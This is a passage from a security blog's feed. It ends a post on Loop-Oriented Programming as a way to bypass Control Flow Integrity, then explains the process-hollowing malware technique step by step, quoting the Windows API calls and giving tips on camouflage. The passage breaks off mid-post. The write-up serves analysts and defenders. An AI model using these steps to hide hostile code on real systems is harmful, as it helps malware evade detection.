and LOP.&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-3Sw8dYh3L40/V2PJJdhU_WI/AAAAAAAAM9Y/4J1g4ZifI-4-spRtBZG7V-nHJGQK9wkNwCLcB/s1600/Screen%2BShot%2B2016-06-17%2Bat%2B11.54.47.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;291&#34; src=&#34;https://2.bp.blogspot.com/-3Sw8dYh3L40/V2PJJdhU_WI/AAAAAAAAM9Y/4J1g4ZifI-4-spRtBZG7V-nHJGQK9wkNwCLcB/s400/Screen%2BShot%2B2016-06-17%2Bat%2B11.54.47.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure 3. CROP VS LOP (from &lt;a href=&#34;https://www.sec.in.tum.de/assets/staff/muntean/Loop-Oriented_Programming_A_New_Code_Reuse_Attack_to_Bypass_Modern0ADefenses.pdf&#34;&gt;here&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;br /&gt;It&#39;s now interesting defining how a &lt;b&gt;Loop&lt;/b&gt; &lt;b&gt;gadget&lt;/b&gt; looks like. So, lets define a loop gadget as a complete working function having 3 keys elements such as :&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;A loop statement&lt;/li&gt;&lt;li&gt;An indirect call instruction within the loop&lt;/li&gt;&lt;li&gt;An index instruction within the loop statement.&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;The following example is taken from initterm() in msvcrt.dll a Microsoft Windows dynamic library.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-T6gzZlf_3Kc/V2PMxcpb7qI/AAAAAAAAM9k/t_mNZZB0OUURczHmGbQ0BIX0X4A6xJW1ACLcB/s1600/Screen%2BShot%2B2016-06-17%2Bat%2B12.10.42.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;122&#34; src=&#34;https://4.bp.blogspot.com/-T6gzZlf_3Kc/V2PMxcpb7qI/AAAAAAAAM9k/t_mNZZB0OUURczHmGbQ0BIX0X4A6xJW1ACLcB/s320/Screen%2BShot%2B2016-06-17%2Bat%2B12.10.42.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure 4: Example of LOP gadget&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;The LOP gadget make possible to set up starting address and ending address. Then Hijacks the control flow to the loop gadget. Then the LOP gadget makes the index pointer pointing to start to start address of the dispatch &#34;table&#34;. It takes the next gadget address and uses an indirect call to invoke the addressed lop gadget. Just after the call it returns to the instruction located right after the indirect call in the loop by a legal ret instruction. Later the gadgets modifies the pointing index making it addressing the next gadget. It ends up by comparing the index value and the &#34;end address&#34;.&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-jCpbl1kGf9A/V2Pok3wqPII/AAAAAAAAM94/cDbBihg2PBIBpGw8_0TyvfgMzCWejUdnQCLcB/s1600/Screen%2BShot%2B2016-06-17%2Bat%2B14.09.25.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;221&#34; src=&#34;https://2.bp.blogspot.com/-jCpbl1kGf9A/V2Pok3wqPII/AAAAAAAAM94/cDbBihg2PBIBpGw8_0TyvfgMzCWejUdnQCLcB/s320/Screen%2BShot%2B2016-06-17%2Bat%2B14.09.25.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure 5 Comparing attacks strategies the green &#34;check&#34; means the technique can bypass the defence policy, the red &#34;x&#34; means it cannot&lt;br /&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;We can now add an additional raw on the attack-comparing–table as shown in Figure5 introducing LOP as the ultimate way to bypass Control Flow Integrity Techniques. Happy hunting !&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Process Hollowing</title>
      <link>http://marcoramilli.com/post/process-hollowing/</link>
      <pubDate>Sun, 29 May 2016 23:03:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/process-hollowing/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Back in 2011 blogs (&lt;a href=&#34;https://code.google.com/archive/p/process-hollowing/downloads&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://www.rohitab.com/discuss/topic/40262-dynamic-forking-process-hollowing/&#34;&gt;here&lt;/a&gt;,&amp;nbsp;&lt;a href=&#34;https://www.trustwave.com/Resources/SpiderLabs-Blog/Analyzing-Malware-Hollow-Processes/&#34;&gt;here&lt;/a&gt;) and papers (&lt;a href=&#34;http://www.autosectools.com/process-hollowing.pdf&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://eprints.qut.edu.au/64181/1/Andrew_White_Thesis.pdf&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://dl.acm.org/citation.cfm?id=2664252&#34;&gt;here&lt;/a&gt;)&amp;nbsp;described a widely used Malware technique to hide malicious actions called: &lt;b&gt;Process&lt;/b&gt; &lt;b&gt;Hollowing&lt;/b&gt;. Nowadays we are experiencing some &#34;flashbacks&#34; to this delightful technique, so I decided to write a little bit about it, just in case someone needs a &#34;refresh&#34;.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Process hollowing is a technique used by some malware in which a legitimate process is loaded on the system solely to act as a container for hostile code. At launch, the legitimate code is deallocated and replaced with malicious code.&lt;/div&gt;&lt;/blockquote&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-ikDW5s8IWVM/VzivgpsYZAI/AAAAAAAAM1o/mnBv45UKY8ctVS3uOn9ZHtjtH67AhaC4gCLcB/s1600/Screen%2BShot%2B2016-05-15%2Bat%2B19.18.03.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;320&#34; src=&#34;https://1.bp.blogspot.com/-ikDW5s8IWVM/VzivgpsYZAI/AAAAAAAAM1o/mnBv45UKY8ctVS3uOn9ZHtjtH67AhaC4gCLcB/s320/Screen%2BShot%2B2016-05-15%2Bat%2B19.18.03.png&#34; width=&#34;262&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Process Hollowing (from &lt;a href=&#34;http://www.autosectools.com/process-hollowing.pdf&#34;&gt;here&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The beauty of this technique is in the help given to malicious process to be hidden between conventional processes. But let&#39;s walk a little bit on the technique:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Step1.&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The Malware starts a legitimate process by using the &lt;b&gt;CreateProcecess&lt;/b&gt;&amp;nbsp;within &lt;b&gt;CREATE_SUSPENDED&lt;/b&gt; flag enabled in the &lt;b&gt;fdwCreate&lt;/b&gt;.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px; margin-bottom: 15px; padding-left: 30px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;&lt;br class=&#34;Apple-interchange-newline&#34; /&gt;&lt;/span&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;// This function is used to run a new program. It creates a new process // and its primary thread. The new process runs the specified executable // file.&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;BOOL CreateProcess(&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;LPCWSTR pszImageName,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;LPCWSTR pszCmdLine,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;LPSECURITY_ATTRIBUTES psaProcess,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;LPSECURITY_ATTRIBUTES psaThread,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;BOOL fInheritHandles,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;DWORD fdwCreate,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;LPVOID pvEnvironment,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;LPWSTR pszCurDir,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;LPSTARTUPINFOW psiStartInfo,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;LPPROCESS_INFORMATION pProcInfo&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;);&lt;/span&gt;&lt;/div&gt;&lt;div style=&#34;background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px; margin-bottom: 15px; padding-left: 30px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt; line-height: normal;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;// fdwCreate&lt;/span&gt;&lt;br style=&#34;box-sizing: border-box; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;// [in] Specifies additional flags that control the priority&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// and the creation of the process.&lt;/span&gt;&lt;br style=&#34;box-sizing: border-box; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;//&lt;/span&gt;&lt;br style=&#34;box-sizing: border-box; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;// CREATE_SUSPENDED fdwCreate flag&lt;/span&gt;&lt;br style=&#34;box-sizing: border-box; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-size: 10pt;&#34;&gt;// The primary thread of the new process is created in a suspended state,&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// and does not run until the ResumeThread function is called.&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;b&gt;Step2.&lt;/b&gt;&lt;br /&gt;The process has been created and it&#39;s in suspended state. Now it&#39;s time to hollow the legitimate code from memory in the hosted process. We might use the following API (&lt;b&gt;ZwUnmapViewOfSection&lt;/b&gt;).&lt;br /&gt;&lt;br /&gt;&lt;div style=&#34;background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px; margin-bottom: 15px; padding-left: 30px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// NtUnmapViewOfSection and ZwUnmapViewOfSection are two versions of&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// the same Windows Native System Services routine.&lt;/span&gt;&lt;br /&gt;&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// The ZwUnmapViewOfSection routine unmaps a view of a section from&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// the virtual address space of a subject process.&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// a view can be a whole or partial mapping of a section object in&amp;nbsp;&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// the virtual address space of a process.&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div style=&#34;background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px; margin-bottom: 15px; padding-left: 30px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;NTSTATUS ZwUnmapViewOfSection(&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in HANDLE ProcessHandle,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in_opt PVOID BaseAddress&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;);&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Step3. &lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The Malware then allocates &amp;nbsp;memory for the new code by classically using &lt;b&gt;VirtualAllocEx. &lt;/b&gt;The Malware should ensure the code is marked as &lt;b&gt;writable &lt;/b&gt;and &lt;b&gt;executable &lt;/b&gt;(by using flProtect).&lt;/div&gt;&lt;br /&gt;&lt;div style=&#34;-webkit-text-stroke-width: 0px; color: black; font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px;&#34;&gt;&lt;/div&gt;&lt;br /&gt;&lt;div style=&#34;-webkit-text-stroke-width: 0px; background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;helvetica neue&#39;, helvetica, arial, &#39;lucida grande&#39;, sans-serif; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 20px; margin-bottom: 15px; orphans: auto; padding-left: 30px; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px;&#34;&gt;&lt;div style=&#34;margin: 0px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;&lt;br class=&#34;Apple-interchange-newline&#34; /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div style=&#34;color: black; font-family: Times; font-size: medium; line-height: normal;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// Reserves or commits a region of memory within the virtual address&amp;nbsp;&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// space of a specified process.&lt;/span&gt;&lt;br /&gt;&lt;br style=&#34;box-sizing: border-box; color: #555555; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;LPVOID WINAPI VirtualAllocEx(&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in HANDLE hProcess,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in_opt LPVOID lpAddress,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in SIZE_T dwSize,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in DWORD flAllocationType,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in DWORD flProtect&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;);&lt;/span&gt;&lt;br /&gt;&lt;br style=&#34;box-sizing: border-box; color: #555555; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif; font-size: 14px; line-height: 20px;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// Memory Protection Constant PAGE_EXECUTE_READWRITE = 0x40&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// Enables execute, read-only, or read/write access to the committed&amp;nbsp;&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// region of pages.&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&#34;box-sizing: border-box; color: #555555; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;b&gt;Step4.&lt;/b&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Now it&#39;s time to write the malicious code into the hollow host process using the romantic &lt;b&gt;WriteProcessMemory&lt;/b&gt;.&lt;/div&gt;&lt;br /&gt;&lt;div style=&#34;-webkit-text-stroke-width: 0px; background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;helvetica neue&#39;, helvetica, arial, &#39;lucida grande&#39;, sans-serif; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 20px; margin-bottom: 15px; orphans: auto; padding-left: 30px; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px;&#34;&gt;&lt;/div&gt;&lt;br /&gt;&lt;div style=&#34;-webkit-text-stroke-width: 0px; background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;helvetica neue&#39;, helvetica, arial, &#39;lucida grande&#39;, sans-serif; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 20px; margin-bottom: 15px; orphans: auto; padding-left: 30px; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px;&#34;&gt;&lt;div style=&#34;margin: 0px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// Writes data to an area of memory in a specified process. The entire&amp;nbsp;&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// area to be written to must be accessible or the operation fails.&lt;/span&gt;&lt;br /&gt;&lt;br style=&#34;box-sizing: border-box; font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;Lucida Grande&#39;, sans-serif;&#34; /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;BOOL WriteProcessMemory(&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;HANDLE hProcess,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;LPVOID lpBaseAddress,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;LPVOID lpBuffer,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;DWORD nSize,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;LPDWORD lpNumberOfBytesWritten&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;);&lt;/span&gt;&lt;/div&gt;&lt;div style=&#34;margin: 0px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;br /&gt;&lt;b&gt;Step5.&lt;/b&gt;&lt;br /&gt;in order to camouflage the Malware, the author should re-set the normal pagination schema by setting Read/Execute protections like any other normal process by using &lt;b&gt;VirtualProtectEx&lt;/b&gt;.&lt;br /&gt;&lt;div style=&#34;background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;helvetica neue&#39;, helvetica, arial, &#39;lucida grande&#39;, sans-serif; font-size: 14px; line-height: 20px; margin-bottom: 15px; padding-left: 30px;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;// Changes the protection on a region of committed pages in the virtual&amp;nbsp;&lt;br style=&#34;box-sizing: border-box;&#34; /&gt;// address space of a specified process.&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;BOOL WINAPI VirtualProtectEx(&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in HANDLE hProcess,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in LPVOID lpAddress,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in SIZE_T dwSize,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__in DWORD flNewProtect,&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;__out PDWORD lpflOldProtect&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;);&lt;/span&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;span style=&#34;box-sizing: border-box; font-family: &amp;quot;courier new&amp;quot; , &amp;quot;courier&amp;quot;; font-size: 10pt;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;It should also set the remote context to point to the new code section. The &lt;b&gt;SetThreatContext &lt;/b&gt;API has been used to reach the scope!&lt;/div&gt;&lt;br /&gt;&lt;div style=&#34;background-color: #eeeeee; box-sizing: border-box; color: #555555; font-family: &#39;helvetica neue&#39;, helvetica, 